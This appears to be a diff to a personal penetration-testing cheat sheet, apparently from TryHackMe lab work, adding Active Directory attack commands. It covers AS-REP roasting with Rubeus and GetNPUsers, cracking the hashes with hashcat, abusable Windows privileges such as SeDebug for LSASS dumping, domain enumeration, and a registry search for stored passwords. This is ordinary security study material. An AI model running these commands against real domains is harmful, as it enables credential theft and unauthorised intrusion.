@@ -79,6 +79,59 @@ crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
 
 nxc smb 10.211.11.20 -u users.txt -p passwords.txt
 
+## AD: Authenticated Enumeration
+
+###  AS-REP Roasting
+    Rubeus.exe asreproast [Windows]
+
+    Impacket’s GetNPUsers.py (Linux/Windows):: ./GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
+
+    Crack the Hash :: hashcat -m 18200 hashes.txt wordlist.txt NB: 18200 ASREP Hash mode
+### Manuel Enumeration
+
+    "whoami /all"
+
+    "Privileges
+Let’s list some high privileges that can be pivotal in planning your next steps. The most interesting privileges to check for are:
+
+SeImpersonatePrivilege: As mentioned already, this privilege allows a process to impersonate the security context of another user after authentication. The “potato” attack revolves around abusing this privilege.
+
+SeAssignPrimaryTokenPrivilege: This privilege permits a process to assign the primary token of another user to a new process. It is used in conjunction with the SeImpersonatePrivilege privilege.
+
+SeBackupPrivilege: This privilege lets users read any file on the system, ignoring file permissions. Consequently, attackers can use it to dump sensitive files like the SAM or SYSTEM hive.
+
+SeRestorePrivilege: This privilege grants the ability to write to any file or registry key without adhering to the set file permissions. Hence, it can be abused to overwrite critical system files or registry settings.
+
+SeDebugPrivilege: This privilege allows the account to attach a debugger to any process. As a result, the attacker can use this privilege to dump memory from LSASS and extract credentials or even inject malicious code into privileged processes.
+
+In brief, whoami /all informs you of your current power, be it due to group memberships or due to privileges. It is essential to note your findings as this tells your starting point."
+
+#### System and Domain enum
+    hostname;
+    systeminfo 
+    set
+#### Domain Users
+    net user /domain
+    net user daniel.turner /domain
+#### Domain Groups
+    net group /domain 
+    net localgroup  
+    net localgroup administrators 
+#### Logged-on Users and Sessions
+    query user, or quser for short, to list users logged on to a machine
+    tasklist /v, net session, 
+#### Identifying Service Accounts
+    Search using wmic: wmic service get Name,StartName || PS Get-WmiObject Win32_Service | select Name, StartName
+    Search Using SC: sc query state= all || sc query state= all | find "DHCP"
+#### Watching the Environment and Registry
+    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v keyword
+#### Installed Applications
+    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+#### Searching the Registry
+    reg query HKLM /f "password" /t REG_SZ /s
+
+
+
 
 ## AD: Authenticated Enumeration 
 
